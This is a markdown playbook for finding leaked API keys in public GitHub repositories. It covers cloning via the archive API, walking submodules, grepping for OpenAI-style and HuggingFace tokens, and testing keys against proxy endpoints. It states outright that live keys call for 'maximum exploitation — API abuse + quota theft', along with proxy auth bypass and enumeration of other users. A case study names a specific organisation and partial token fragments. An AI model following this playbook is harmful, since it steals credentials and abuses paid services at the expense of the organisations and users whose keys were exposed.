# GitHub Secret Leakage Playbook — Recover API Keys from Public Repos

## When to Use
- Target is a GitHub organization/repo (given URL or discovered)
- Searching for leaked API keys, tokens, environment variables
- Repo uses submodules (`.gitmodules`) — actual code in separate repos
- Keys are partially masked (ellipsis: `<redacted>`) but need full recovery

## Workflow

### 1. Clone Strategy
```bash
# git clone may fail if HTTPS disabled or SSH host key rejected
# Fallback: GitHub archive API (no auth needed)
curl -sL "https://api.github.com/repos/<org>/<repo>/zipball" -o repo.zip
unzip repo.zip

# Alternative: raw.githubusercontent.com for single files
curl -sL "https://raw.githubusercontent.com/<org>/<repo>/main/path/to/file.py"
```

### 2. Submodule Extraction
```bash
# Repo may be submodules only (Everlyn pattern)
# .gitmodules contains submodule URLs pointing to other orgs
# Read .gitmodules:
#   [submodule "Wasserstein-VQ"]
#   url = https://github.com/Openlyn/Wasserstein-VQ.git
# Each submodule = separate repo to download
for repo in "Org/Repo1" "Org/Repo2" "Org/Repo3"; do
  curl -sL "https://api.github.com/repos/${repo}/zipball" -o "/tmp/$(echo $repo | cut -d/ -f2).zip"
  unzip -qo "/tmp/$(echo $repo | cut -d/ -f2).zip" -d "/tmp/$(echo $repo | cut -d/ -f2)"
done
```

### 3. API Key Scanning
```bash
# Search for full keys (some may be unmasked in deep files)
grep -rHn 'sk-[a-zA-Z0-9]\{20,60\}' /tmp/repo/

# Search for all auth patterns
grep -rHnE '(api_key|API_KEY|openai\.api_key|Bearer|Authorization)' /tmp/repo/ | grep -v '#' | grep -v 'https://'

# Search for HuggingFace tokens
grep -rHn 'hf_[a-zA-Z0-9_]\{20,60\}' /tmp/repo/

# Search for proxy endpoints (custom API proxies — zhizengzeng, apikeyplus)
grep -rHnE '(api_base|openai\.api_base|api\.)\s*=\s*[\047\"]http' /tmp/repo/
```

### 4. Key Validation — Determine Status
```bash
# Test via proxy endpoint with partial key
curl -s "https://<third-party-endpoint>/v1/models" \
  -H "Authorization: Bearer <redacted>"

# Possible responses:
#   "need zhizengzeng key" → proxy uses CUSTOM keys, not OpenAI keys
#   "invalid" → key ROTATED
#   "authenticated" → key LIVE
#   401 + "Authorization is wrong. Note: You don't need OpenAI key..." → valid proxy but wrong user

# Test expired/rotated key
# 401 + "invalid" → rotated
# 401 + "expired" → dead for good
```

### 5. Key Recovery Attempts
```bash
# Git blob/object traversal (key may be full in tree commit)
curl -s "https://api.github.com/repos/<org>/<repo>/git/trees/main?recursive=1"

# Git history — check previous commits (only works if repo has >1 commit)
curl -s "https://api.github.com/repos/<org>/<repo>/commits?per_page=5"

# Raw blob access
curl -s "https://raw.githubusercontent.com/<org>/<repo>/<sha>/file.py"
```

## Key Status Classification

| Status | Response Pattern | Action |
|--------|-----------------|--------|
| **LIVE** | 200 OK + models listed | Maximum exploitation — API abuse + quota theft |
| **PROXY_ONLY** | 200 OK but needs custom auth | Test proxy bypass + enumeration of other users |
| **EXPIRED** | 401 "token expired" | No value — move on |
| **ROTATED** | 401 "invalid" | No value — move on |
| **SANDBOX** | 401 on real API + comment says "sandbox" | Validate their sandbox scope (may still work there) |

### 6. Post-Discovery Triage
- **If key is LIVE + high worth**: Switch to quota theft and abuse effort
- **If key is via proxy**: Test for auth bypass, other keys enumeration, proxy registration page
- **If key is rotated/dead**: Record finding, assess how many OTHER users copied the code before key was rotated → Was it a fork? A public template? The leakage window matters for impact assessment.

## Case Study: Everlyn Labs (2026-07-29)
- Repo: GitHub.com/Everlyn-Labs/Everlyn-1 → submodule graph → 4 repos (ANTRP, Wasserstein-VQ, EfficientARV)
- 2 OpenAI-compatible keys found: `<redacted>` (gpt4v_eval.py, GPT-4V hallucinations judge) + `<redacted>` (openai_demo.py, gpt-4 completion)
- Endpoints: <third-party-endpoint> — both CHINESE commercial API proxy services
- Key 1 (zhizengzeng): 401 `"need zhizengzeng key, not OpenAI key"` → proxy requires custom auth
- Key 2 (apikeyplus): Live but Rotated 401 → invalid
- Key 3: HuggingFace token `hf_94w...HWLL` — sandbox only (comments: "only for sandbox")
- Lesson: AI/ML research repos contain commercial service keys, especially Chinese API proxies. The partial mask (ellipsis) means keys were leaked then partially redacted in the same commit — no git history traversal possible. Proxy endpoint auth mechanisms vary.

## Pitfalls
- **Partial masking**: Many repos purposefully truncate keys in latest commit. They masked after leakage.
- **One-commit repos**: No git history traversal possible — check if the raw file from initial commit works.
- **Git-remote-https disabled**: Some environments block `https://` git. Use the curl API procedure above.